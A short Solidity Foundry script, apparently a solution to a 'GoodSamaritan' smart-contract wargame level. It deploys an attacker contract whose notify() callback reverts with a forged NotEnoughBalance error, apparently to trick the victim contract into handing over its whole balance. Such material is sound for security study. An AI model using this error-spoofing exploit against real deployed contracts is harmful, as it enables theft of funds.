// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

interface INotifyable {
    function notify(uint256 amount) external;
}

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract GoodSamaritanAttacker is Script, HelperConfigLib {
    function run(address _victimAddress) external {
        vm.startBroadcast(ATTACKER_KEY);
        MyAttacker myAttacker = new MyAttacker(_victimAddress);
        myAttacker.attack();

        vm.stopBroadcast();
    }
}

contract MyAttacker is INotifyable {
    IGoodSamaritan goodSamaritan;

    error NotEnoughBalance();

    constructor(address _victimAddress) {
        goodSamaritan = IGoodSamaritan(_victimAddress);
    }

    function attack() external {
        bool success = goodSamaritan.requestDonation();
        require(!success, "Attack Failed");
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
